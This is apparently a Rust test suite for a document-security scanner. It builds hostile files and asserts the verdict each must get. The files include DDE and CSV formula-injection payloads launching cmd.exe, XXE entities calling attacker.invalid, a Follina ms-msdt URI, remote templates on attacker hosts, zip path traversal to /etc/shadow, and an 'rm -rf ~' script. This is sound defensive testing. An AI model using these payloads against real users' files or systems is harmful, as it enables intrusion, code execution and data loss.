//! Hostile files, one per attack, each with the verdict (and the class of finding) it must get.
//!
//! Every vector is built here, scanned with the production policy (the one the sandboxed guest
//! runs with), and checked three ways:
//!
//! * the **verdict** is exactly the expected one: `Rejected` for structural attacks,
//!   `ActiveContentNeutralized` for active payloads, `Unverified` for files whose content the
//!   scanner could not or would not vouch for, `HiddenTrackers` for remote content that loads by
//!   itself — and never `Clean` for any of them;
//! * the **finding** that explains the verdict is in the report;
//! * scanning the same bytes again gives the same report (the scan is deterministic).
//!
//! Vectors that exist to guard one audit finding in particular live in `hardening.rs`; this suite
//! is the broad one: container structure, XML attacks, every spelling of DDE, Excel 4.0 macros,
//! PDF and RTF tricks, polyglots, databases and drawings, executables and encryption.

use arca_container::cfb::writer::CfbBuilder;
use arca_container::zip::writer::{Compression, ZipWriter};

use super::builders::*;
use super::corpus::{assert_verdict_invariants, mark_member_encrypted};
use super::fixtures::*;
use crate::report::{ThreatKind as K, Verdict};
use crate::scan_default;

/// What a vector must produce.
#[derive(Clone, Copy)]
enum Expect {
    /// `Rejected`, with this finding (if named).
    Rejected(Option<K>),
    /// `ActiveContentNeutralized`, with this finding.
    Active(K),
    /// `Unverified`, with this finding.
    Unverified(K),
    /// `HiddenTrackers`, with this finding.
    Tracker(K),
}

#[track_caller]
fn run(expect: Expect, data: &[u8]) {
    let r = scan_default(data);
    assert_verdict_invariants(&r, "vector");
    let (verdict, kind) = match expect {
        Expect::Rejected(k) => (Verdict::Rejected, k),
        Expect::Active(k) => (Verdict::ActiveContentNeutralized, Some(k)),
        Expect::Unverified(k) => (Verdict::Unverified, Some(k)),
        Expect::Tracker(k) => (Verdict::HiddenTrackers, Some(k)),
    };
    assert_eq!(r.verdict, verdict, "{:#?}", r.findings);
    if let Some(k) = kind {
        assert!(r.has(k), "expected {k:?}; got {:#?}", r.findings);
    }
    assert_ne!(r.verdict, Verdict::Clean);
    assert_eq!(scan_default(data), r, "the scan must be deterministic");
}

macro_rules! vector {
    ($name:ident, $expect:expr, $build:expr) => {
        #[test]
        fn $name() {
            let data: Vec<u8> = $build;
            run($expect, &data);
        }
    };
}

// ---- helpers --------------------------------------------------------------------------------------

fn patch(data: &mut [u8], at: usize, bytes: &[u8]) {
    data[at..at + bytes.len()].copy_from_slice(bytes);
}

fn u32_at(data: &[u8], at: usize) -> usize {
    u32::from_le_bytes(data[at..at + 4].try_into().unwrap()) as usize
}

fn positions(data: &[u8], sig: &[u8]) -> Vec<usize> {
    data.windows(sig.len()).enumerate().filter(|(_, w)| *w == sig).map(|(i, _)| i).collect()
}

fn zip_with(name: &str, data: &[u8]) -> Vec<u8> {
    let mut w = ZipWriter::new();
    w.add(name, data, Compression::Stored).unwrap();
    w.finish().unwrap()
}

/// A compound file with two big (regular-sector) streams.
fn cfb_two_big_streams() -> Vec<u8> {
    cfb_with(&[("A", vec![0x41; 6000]), ("B", vec![0x42; 6000])])
}

/// Offset of directory entry `n` of a compound file built by `CfbBuilder`.
fn dir_entry(f: &[u8], n: usize) -> usize {
    (u32_at(f, 48) + 1) * 512 + n * 128
}

fn docx_with_xml(part: &str, xml: &str) -> Vec<u8> {
    let mut o = docx();
    o.set(part, xml);
    o.build()
}

// ---- ZIP structure ----------------------------------------------------------------------------------

vector!(zip_truncated_in_the_middle, Expect::Rejected(None), {
    let mut d = docx().build();
    d.truncate(d.len() / 2);
    d
});
vector!(zip_truncated_in_the_first_header, Expect::Rejected(None), {
    let mut d = docx().build();
    d.truncate(10);
    d
});
vector!(zip_central_directory_signature_damaged, Expect::Rejected(None), {
    let mut d = docx().build();
    let at = positions(&d, b"PK\x01\x02")[0];
    d[at] = b'X';
    d
});
vector!(zip_end_record_damaged, Expect::Rejected(None), {
    let mut d = docx().build();
    let at = positions(&d, b"PK\x05\x06")[0];
    d[at + 2] = 0xFF;
    d
});
vector!(zip_entry_count_inflated_to_the_16_bit_limit, Expect::Rejected(None), {
    let mut d = docx().build();
    let at = positions(&d, b"PK\x05\x06")[0];
    patch(&mut d, at + 8, &[0xFF, 0xFF, 0xFF, 0xFF]);
    d
});
vector!(zip_central_directory_offset_outside_the_file, Expect::Rejected(None), {
    let mut d = docx().build();
    let at = positions(&d, b"PK\x05\x06")[0];
    patch(&mut d, at + 16, &[0xFF, 0xFF, 0xFF, 0x7F]);
    d
});
vector!(zip_local_header_method_disagrees_with_the_directory, Expect::Rejected(None), {
    let mut d = docx().build();
    let at = positions(&d, b"PK\x03\x04")[0];
    patch(&mut d, at + 8, &[99, 0]);
    d
});
vector!(zip_declared_size_is_a_lie, Expect::Rejected(Some(K::CompressionBomb)), {
    let mut d = docx().build();
    for at in positions(&d, b"PK\x03\x04") {
        patch(&mut d, at + 22, &[1, 0, 0, 0]);
    }
    for at in positions(&d, b"PK\x01\x02") {
        patch(&mut d, at + 24, &[1, 0, 0, 0]);
    }
    d
});
vector!(zip_bomb_by_ratio, Expect::Rejected(Some(K::CompressionBomb)), {
    let mut w = ZipWriter::new();
    w.add("[Content_Types].xml", &vec![b' '; 8 << 20], Compression::Deflated).unwrap();
    w.finish().unwrap()
});
vector!(zip_member_name_climbs_out, Expect::Rejected(Some(K::PathTraversal)), {
    raw_zip(&[Raw::new("../../../../etc/shadow", b"secret")])
});
vector!(zip_member_name_is_absolute, Expect::Rejected(Some(K::PathTraversal)), {
    raw_zip(&[Raw::new("/root/exploit", b"x")])
});
vector!(zip_member_name_has_a_drive_letter, Expect::Rejected(Some(K::PathTraversal)), {
    raw_zip(&[Raw::new("C:/Windows/win.ini", b"x")])
});
vector!(zip_member_name_uses_backslashes, Expect::Rejected(Some(K::PathTraversal)), {
    raw_zip(&[Raw::new("word\\..\\..\\evil.dll", b"x")])
});
vector!(zip_member_name_contains_nul, Expect::Rejected(None), {
    raw_zip(&[Raw::new("word/document\0.xml", b"x")])
});
vector!(zip_member_is_a_symbolic_link, Expect::Rejected(Some(K::PathTraversal)), {
    let mut link = Raw::new("word/link", b"/etc/passwd");
    link.made_by = (3 << 8) | 20;
    link.ext_attr = 0o120_777 << 16;
    raw_zip(&[link])
});
vector!(zip_names_differ_only_in_case, Expect::Rejected(Some(K::ParserDifferential)), {
    raw_zip(&[Raw::new("word/document.xml", b"a"), Raw::new("Word/Document.xml", b"b")])
});
vector!(zip_two_directory_entries_share_one_local_header, Expect::Rejected(None), {
    let mut d = raw_zip(&[Raw::new("a.xml", b"aaaa"), Raw::new("b.xml", b"bbbb")]);
    let heads = positions(&d, b"PK\x01\x02");
    let first_offset = d[heads[0] + 42..heads[0] + 46].to_vec();
    patch(&mut d, heads[1] + 42, &first_offset);
    d
});
vector!(zip_with_a_second_end_record_appended, Expect::Unverified(K::TrailingData), {
    let mut d = docx().build();
    d.extend_from_slice(
        b"PK\x05\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
    );
    d
});
vector!(zip_without_a_package_or_document_inside, Expect::Rejected(None), {
    zip_with("readme.txt", b"hello")
});
vector!(zip_member_is_encrypted, Expect::Unverified(K::EncryptedMember), {
    let mut o = docx();
    o.set("word/embeddings/blob.bin", vec![0x41u8; 64]);
    let mut d = o.build();
    mark_member_encrypted(&mut d, "word/embeddings/blob.bin");
    d
});

// ---- compound file structure ------------------------------------------------------------------------

vector!(cfb_cut_after_the_header, Expect::Rejected(None), {
    let mut d = cfb_two_big_streams();
    d.truncate(512);
    d
});
vector!(cfb_signature_destroyed, Expect::Rejected(None), {
    let mut d = cfb_two_big_streams();
    d[0] = 0;
    d
});
vector!(cfb_sector_shift_is_not_9_or_12, Expect::Rejected(Some(K::MalformedContainer)), {
    let mut d = cfb_two_big_streams();
    patch(&mut d, 30, &[7, 0]);
    d
});
vector!(cfb_mini_sector_shift_is_not_6, Expect::Rejected(Some(K::MalformedContainer)), {
    let mut d = cfb_two_big_streams();
    patch(&mut d, 32, &[10, 0]);
    d
});
vector!(cfb_fat_sector_count_exceeds_the_file, Expect::Rejected(Some(K::MalformedContainer)), {
    let mut d = cfb_two_big_streams();
    patch(&mut d, 44, &[0xFF, 0xFF, 0x00, 0x00]);
    d
});
vector!(cfb_difat_count_exceeds_the_file, Expect::Unverified(K::ScanLimitReached), {
    let mut d = cfb_two_big_streams();
    patch(&mut d, 72, &[0xFE, 0xFF, 0x00, 0x00]);
    d
});
vector!(
    cfb_first_directory_sector_is_out_of_range,
    Expect::Rejected(Some(K::MalformedContainer)),
    {
        let mut d = cfb_two_big_streams();
        patch(&mut d, 48, &[0xFF, 0xFF, 0xFF, 0x7F]);
        d
    }
);
vector!(cfb_every_fat_chain_loops_back, Expect::Rejected(Some(K::ParserDifferential)), {
    let mut d = cfb_two_big_streams();
    let fat = (u32_at(&d, 76) + 1) * 512;
    for i in 0..128u32 {
        let at = fat + 4 * i as usize;
        patch(&mut d, at, &i.to_le_bytes());
    }
    d
});
vector!(
    cfb_directory_tree_loops_back_to_the_root,
    Expect::Rejected(Some(K::ParserDifferential)),
    {
        let mut d = cfb_two_big_streams();
        let root = dir_entry(&d, 0);
        patch(&mut d, root + 76, &0u32.to_le_bytes());
        d
    }
);
vector!(cfb_two_streams_share_their_sectors, Expect::Rejected(Some(K::ParserDifferential)), {
    let mut d = cfb_two_big_streams();
    let first = dir_entry(&d, 1) + 116;
    let second = dir_entry(&d, 2) + 116;
    let start = d[first..first + 4].to_vec();
    patch(&mut d, second, &start);
    d
});
vector!(cfb_mini_stream_chain_loops_back, Expect::Unverified(K::MalformedContainer), {
    let mut d = cfb_with(&[("WordDocument", vec![0x41; 300])]);
    let mini_fat = (u32_at(&d, 60) + 1) * 512;
    for i in 0..128u32 {
        patch(&mut d, mini_fat + 4 * i as usize, &i.to_le_bytes());
    }
    d
});
vector!(cfb_with_bytes_after_the_last_sector, Expect::Unverified(K::TrailingData), {
    let mut d = cfb_with(&[("WordDocument", {
        let mut w = vec![0u8; 0x400];
        w[0..2].copy_from_slice(&0xA5ECu16.to_le_bytes());
        w
    })]);
    d.extend_from_slice(&[0x41; 100]);
    d
});
vector!(cfb_with_an_entry_nothing_links_to, Expect::Unverified(K::OrphanedOleEntries), {
    let mut d = cfb_with(&[("A", vec![1; 8]), ("B", vec![2; 8]), ("C", vec![3; 8])]);
    let dir = dir_entry(&d, 0);
    for i in 0..4 {
        let e = dir + i * 128;
        if d[e..e + 2] == [b'C', 0] {
            // Detach "C": nothing refers to it any more.
            for j in 0..4 {
                let other = dir + j * 128;
                for field in [68usize, 72, 76] {
                    if u32_at(&d, other + field) == i {
                        patch(&mut d, other + field, &0xFFFF_FFFFu32.to_le_bytes());
                    }
                }
            }
        }
    }
    d
});

// ---- XML attacks --------------------------------------------------------------------------------------

vector!(
    xml_billion_laughs,
    Expect::Rejected(Some(K::XmlEntityAttack)),
    docx_with_xml(
        "word/document.xml",
        r#"<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">]><w:document xmlns:w="x">&lol2;</w:document>"#
    )
);
vector!(
    xml_external_entity_in_the_settings_part,
    Expect::Rejected(Some(K::XmlEntityAttack)),
    docx_with_xml(
        "word/settings.xml",
        r#"<!DOCTYPE doc SYSTEM "http://127.0.0.1:8080/xxe.dtd"><w:settings xmlns:w="x">&send;</w:settings>"#
    )
);
vector!(
    xml_parameter_entity_pointing_at_ftp,
    Expect::Rejected(Some(K::XmlEntityAttack)),
    docx_with_xml(
        "word/document.xml",
        r#"<!DOCTYPE d [<!ENTITY % dtd SYSTEM "ftp://attacker.invalid/f.dtd">%dtd;]><w:document xmlns:w="x"/>"#
    )
);
vector!(
    xml_undefined_entity,
    Expect::Rejected(Some(K::XmlEntityAttack)),
    docx_with_xml("word/document.xml", r#"<w:document xmlns:w="x">&nope;</w:document>"#)
);
vector!(
    xml_nesting_deeper_than_the_limit,
    Expect::Unverified(K::MalformedContainer),
    docx_with_xml("word/document.xml", &format!("{}{}", "<w:p>".repeat(200), "</w:p>".repeat(200)))
);
vector!(
    xml_unbalanced_tags,
    Expect::Unverified(K::MalformedContainer),
    docx_with_xml("word/document.xml", "<w:document><w:body><w:p><w:r><w:t>Hello")
);
vector!(
    xml_duplicate_attribute,
    Expect::Unverified(K::MalformedContainer),
    docx_with_xml("word/document.xml", r#"<w:document xmlns:w="x" a="1" a="2"/>"#)
);
vector!(
    xml_declares_an_encoding_it_is_not_written_in,
    Expect::Unverified(K::MalformedContainer),
    docx_with_xml(
        "word/document.xml",
        "<?xml version=\"1.0\" encoding=\"UTF-32\"?><w:document xmlns:w=\"x\"/>"
    )
);
vector!(
    xml_stylesheet_instruction_fetches_a_remote_file,
    Expect::Tracker(K::XmlStylesheetReference),
    docx_with_xml(
        "customXml/item1.xml",
        r#"<?xml-stylesheet type="text/xsl" href="http://attacker.example/s.xsl"?><root/>"#
    )
);

// ---- DDE, in every spelling ---------------------------------------------------------------------------

vector!(dde_in_one_instruction, Expect::Active(K::DdeField), {
    docx_body(&format!(
        "<w:p>{}</w:p>",
        field(" DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\" ")
    ))
    .build()
});
vector!(dde_split_over_runs, Expect::Active(K::DdeField), docx_body(&dde_body()).build());
vector!(dde_keyword_behind_quote_character_codes, Expect::Active(K::DdeField), {
    docx_body(dde_quote_body()).build()
});
vector!(dde_keyword_behind_quote_text, Expect::Active(K::DdeField), {
    docx_body(&nested_field("", "QUOTE \"DDEAUTO\"", " cmd \"/c calc\" ")).build()
});
vector!(dde_keyword_computed_by_a_reference, Expect::Active(K::DdeField), {
    docx_body(&nested_field("", "REF dde_name", " cmd \"/c calc\" ")).build()
});
vector!(dde_in_a_simple_field, Expect::Active(K::DdeField), {
    docx_body(
        r#"<w:p><w:fldSimple w:instr="DDE cmd calc"><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p>"#,
    )
    .build()
});
vector!(dde_in_a_comment, Expect::Active(K::DdeField), {
    let mut o = docx();
    o.set(
        "[Content_Types].xml",
        content_types(&[
            ("/word/document.xml", CT_DOCX),
            (
                "/word/comments.xml",
                "application/vnd.openxmlformats-officedocument.wordprocessingml.comments+xml",
            ),
        ]),
    )
    .set("word/comments.xml", document(&dde_body()));
    o.build()
});
vector!(dde_in_a_footnote_part, Expect::Active(K::DdeField), {
    let mut o = docx();
    o.set(
        "[Content_Types].xml",
        content_types(&[
            ("/word/document.xml", CT_DOCX),
            (
                "/word/footnotes.xml",
                "application/vnd.openxmlformats-officedocument.wordprocessingml.footnotes+xml",
            ),
        ]),
    )
    .set("word/footnotes.xml", document(&dde_body()));
    o.build()
});
vector!(dde_in_a_binary_word_document, Expect::Active(K::DdeField), doc_binary());
vector!(
    dde_in_a_flat_xml_document,
    Expect::Active(K::DdeField),
    br#"<?xml version="1.0"?><w:wordDocument xmlns:w="http://schemas.microsoft.com/office/word/2003/wordml"><w:body><w:p><w:fldSimple w:instr="DDEAUTO cmd"/></w:p></w:body></w:wordDocument>"#.to_vec()
);
vector!(dde_in_a_spreadsheet_formula, Expect::Active(K::DdeFormula), {
    let mut o = xlsx(r#"<row r="1"><c r="A1"><f>cmd|' /C calc'!A0</f></c></row>"#);
    o.set("docProps/app.xml", app_props());
    o.build()
});
vector!(dde_in_a_csv_cell, Expect::Active(K::CsvFormulaInjection), {
    b"name,note\nx,=cmd|' /C calc'!A0\n".to_vec()
});
vector!(
    dde_in_an_rtf_field,
    Expect::Active(K::DdeField),
    rtf(r#"{\field{\*\fldinst DDEAUTO c:\\windows\\system32\\cmd.exe "/c calc"}{\fldrslt x}}"#)
);

// ---- macros ----------------------------------------------------------------------------------------------

vector!(vba_autoexec_macro, Expect::Active(K::MacroAutoExec), docm_with_macro().build());
vector!(vba_project_in_a_package_declared_macro_free, Expect::Active(K::VbaMacros), {
    let mut o = docm_with_macro();
    o.set(
        "[Content_Types].xml",
        content_types(&[
            ("/word/document.xml", CT_DOCX),
            ("/word/vbaProject.bin", "application/vnd.ms-office.vbaProject"),
        ]),
    );
    o.build()
});
vector!(vba_project_cut_to_a_header, Expect::Active(K::VbaMacros), {
    let mut o = docm_with_macro();
    o.set("word/vbaProject.bin", vec![0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1, 0, 0, 0]);
    o.build()
});
vector!(vba_project_that_is_not_a_compound_file, Expect::Active(K::VbaMacros), {
    let mut o = docm_with_macro();
    o.set("word/vbaProject.bin", b"Attribute VB_Name = \"x\"\nSub AutoOpen()\nEnd Sub\n".to_vec());
    o.build()
});
vector!(xlm_macro_sheet_with_a_hidden_auto_open, Expect::Active(K::XlmMacroSheet), {
    xlsm_with_xlm().build()
});
vector!(xlm_formulas_assembled_from_character_codes, Expect::Active(K::XlmMacroSheet), {
    let mut o = xlsm_with_xlm();
    o.set(
        "xl/macrosheets/sheet1.xml",
        r#"<xm:macrosheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"><sheetData><row r="1"><c r="A1"><f>EXEC(CHAR(99)&amp;CHAR(109)&amp;CHAR(100)&amp;" /c calc")</f></c></row><row r="2"><c r="A2"><f>GOTO(A1)</f></c></row></sheetData></xm:macrosheet>"#,
    );
    o.build()
});
vector!(xlm_auto_open_under_a_mixed_case_name, Expect::Active(K::XlmAutoOpenName), {
    let mut o = xlsx(r#"<row r="1"><c r="A1"><v>1</v></c></row>"#);
    o.set(
        "xl/workbook.xml",
        format!(r#"<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="{R_NS}"><sheets><sheet name="S" sheetId="1" r:id="rId1"/></sheets><definedNames><definedName name="AuTo_OpEn">S!$A$1</definedName></definedNames></workbook>"#),
    );
    o.build()
});
vector!(xlm_macro_sheet_in_a_binary_workbook, Expect::Active(K::XlmMacroSheet), {
    let book = biff_workbook(&[biff_sheet(0x01, "Macro1")]);
    cfb_with(&[("Workbook", book)])
});
vector!(excel_workbook_protected_by_a_password, Expect::Unverified(K::EncryptedDocument), {
    let book = biff_workbook(&[biff_record(0x002F, &[1, 0, 1, 0])]);
    cfb_with(&[("Workbook", book)])
});

// ---- remote content ------------------------------------------------------------------------------------

vector!(remote_template_over_https, Expect::Active(K::RemoteTemplate), {
    let mut o = docx();
    o.set(
        "word/_rels/settings.xml.rels",
        rels(&[("rId1", "attachedTemplate", "https://attacker.example/t.dotm", true)]),
    );
    o.build()
});
vector!(remote_template_over_a_unc_path, Expect::Active(K::UncPathReference), {
    let mut o = docx();
    o.set(
        "word/_rels/settings.xml.rels",
        rels(&[("rId1", "attachedTemplate", "\\\\evil-server\\share\\t.dotm", true)]),
    );
    o.build()
});
vector!(tracking_pixel, Expect::Tracker(K::ExternalImage), {
    let mut o = docx();
    o.set(
        "word/_rels/document.xml.rels",
        rels(&[
            ("rId1", "settings", "settings.xml", false),
            ("rId7", "image", "https://t.example/open.gif?u=42", true),
        ]),
    );
    o.build()
});
vector!(follina_protocol_handler, Expect::Active(K::DangerousProtocolUri), {
    let mut o = docx();
    o.set(
        "word/_rels/document.xml.rels",
        rels(&[
            ("rId1", "settings", "settings.xml", false),
            ("rId2", "oleObject", "ms-msdt:/id PCWDiagnostic /skip force", true),
        ]),
    );
    o.build()
});

// ---- PDF and RTF ------------------------------------------------------------------------------------------

vector!(pdf_javascript_in_a_compressed_stream, Expect::Active(K::PdfJavaScript), pdf_with_js());
vector!(
    pdf_launch_action,
    Expect::Active(K::PdfLaunchAction),
    pdf_with(b"4 0 obj << /S /Launch /F (cmd.exe) >> endobj\n")
);
vector!(
    pdf_names_spelled_with_hex_escapes,
    Expect::Active(K::PdfJavaScript),
    pdf_with(b"4 0 obj << /S /J#61vaScr#69pt /JS (x) >> endobj\n")
);
vector!(pdf_cut_inside_a_stream, Expect::Unverified(K::MalformedContainer), {
    let mut d = pdf_with_js();
    let at = d.windows(6).position(|w| w == b"stream").unwrap();
    d.truncate(at + 20);
    d
});
vector!(pdf_zip_polyglot, Expect::Unverified(K::PolyglotFile), {
    let mut d = pdf_with(b"");
    d.extend_from_slice(&docx().build());
    d
});
vector!(
    pdf_stream_in_a_filter_the_scanner_cannot_read,
    Expect::Unverified(K::ScanLimitReached),
    pdf_with(&stream_object("/Filter /Foo", b"opaque"))
);
vector!(
    pdf_encrypted,
    Expect::Unverified(K::EncryptedDocument),
    pdf_with(b"4 0 obj << /Filter /Standard /V 4 >> endobj\n5 0 obj << /Encrypt 4 0 R >> endobj\n")
);
vector!(
    rtf_equation_editor_exploit,
    Expect::Active(K::ExploitableOleClass),
    rtf_equation_exploit()
);
vector!(
    rtf_object_that_updates_itself,
    Expect::Active(K::RtfAutoUpdateObject),
    rtf(r#"{\object\objautlink\objupdate{\*\objclass Word.Document.8}{\*\objdata 01050000}}"#)
);
vector!(rtf_groups_nested_beyond_any_limit, Expect::Unverified(K::MalformedContainer), {
    let mut d = b"{\\rtf1".to_vec();
    d.extend(std::iter::repeat_n(b'{', 100_000));
    d
});
vector!(
    rtf_header_that_only_word_accepts,
    Expect::Unverified(K::ObfuscatedName),
    b"{\\rtxyz\\ansi hello}".to_vec()
);

// ---- polyglots ------------------------------------------------------------------------------------------------

vector!(picture_with_a_package_behind_it, Expect::Unverified(K::PolyglotFile), {
    let mut d = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;".to_vec();
    d.extend_from_slice(&docx().build());
    d
});
vector!(package_with_junk_after_the_end, Expect::Unverified(K::TrailingData), {
    let mut d = docx().build();
    d.extend_from_slice(b"\x7FELF payload");
    d
});
vector!(package_with_junk_between_members, Expect::Unverified(K::UnreferencedArchiveData), {
    let mut d = docx().build();
    super::corpus::insert_gap_before_central_directory(&mut d, 128);
    d
});

// ---- databases and drawings -----------------------------------------------------------------------------------

const MDB: &[u8] = include_bytes!("../../../../tests/fixtures/access-2000.mdb");

// (The fixture database carries a VBA project, so the verdict is the stronger one; the catalog
// that could not be read is reported all the same.)
vector!(jet_catalog_page_chain_loops_back, Expect::Active(K::MalformedContainer), {
    let mut d = MDB.to_vec();
    // The table-definition page of the catalog names itself as its next page.
    patch(&mut d, 2 * 4096 + 4, &2u32.to_le_bytes());
    d
});
vector!(jet_database_with_an_autoexec_macro, Expect::Active(K::MacroAutoExec), {
    arca_container::jet::database_with_objects(1, &[(-32766, "AutoExec")])
});
vector!(
    jet_database_with_an_autoexec_name_in_a_damaged_catalog,
    Expect::Active(K::MacroAutoExec),
    {
        let mut d = MDB.to_vec();
        d[2 * 4096..3 * 4096].fill(0);
        d.extend_from_slice(b"AutoExec");
        d
    }
);
vector!(jet_header_and_nothing_else, Expect::Unverified(K::EncryptedDocument), {
    let mut d = vec![0u8; 3 * 4096];
    d[4..19].copy_from_slice(b"Standard Jet DB");
    d[0x14] = 1;
    d
});
vector!(
    visio_binary_drawing_cut_inside_a_chunk,
    Expect::Unverified(K::ScanLimitReached),
    cfb_with(&[("VisioDocument", vec![0x56, 0x69, 0x73, 0x69, 0x6F, 0x00, 0x01, 0x00, 0x14])])
);
vector!(visio_binary_drawing_with_a_run_add_on, Expect::Active(K::ProgramAction), {
    let mut s = vec![0u8; 40];
    s.extend("RUNADDON(\"x\")".encode_utf16().flat_map(u16::to_le_bytes));
    cfb_with(&[("VisioDocument", s)])
});

// ---- executables and encryption ----------------------------------------------------------------------------------

vector!(
    program_posing_as_a_document,
    Expect::Rejected(Some(K::DisguisedExecutable)),
    b"MZ\x90\x00\x03\x00\x00\x00 This program cannot be run in DOS mode".to_vec()
);
vector!(
    unix_program_posing_as_a_document,
    Expect::Rejected(Some(K::DisguisedExecutable)),
    b"\x7FELF\x02\x01\x01\x00".to_vec()
);
vector!(
    shell_script_posing_as_a_document,
    Expect::Rejected(Some(K::DisguisedExecutable)),
    b"#!/bin/sh\nrm -rf ~\n".to_vec()
);
vector!(
    shortcut_posing_as_a_document,
    Expect::Rejected(Some(K::DisguisedExecutable)),
    vec![0x4C, 0, 0, 0, 0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xC0, 0, 0, 0, 0, 0, 0, 0x46, 1, 2, 3]
);
vector!(program_stored_as_an_embedded_object, Expect::Active(K::EmbeddedExecutable), {
    let mut o = docx();
    o.set("word/embeddings/oleObject1.bin", b"MZ\x90\x00 payload".to_vec());
    o.set(
        "[Content_Types].xml",
        content_types(&[
            ("/word/document.xml", CT_DOCX),
            (
                "/word/embeddings/oleObject1.bin",
                "application/vnd.openxmlformats-officedocument.oleObject",
            ),
        ]),
    );
    o.build()
});
vector!(password_protected_package, Expect::Unverified(K::EncryptedDocument), {
    let mut b = CfbBuilder::new();
    b.add_stream("EncryptionInfo", vec![4, 0, 4, 0, 0, 0, 0, 0]).unwrap();
    b.add_stream("EncryptedPackage", vec![0x55; 64]).unwrap();
    b.finish().unwrap()
});
vector!(word_document_protected_by_a_password, Expect::Unverified(K::EncryptedDocument), {
    let mut w = vec![0u8; 0x400];
    w[0..2].copy_from_slice(&0xA5ECu16.to_le_bytes());
    w[0x0A..0x0C].copy_from_slice(&0x0100u16.to_le_bytes());
    cfb_with(&[("WordDocument", w)])
});
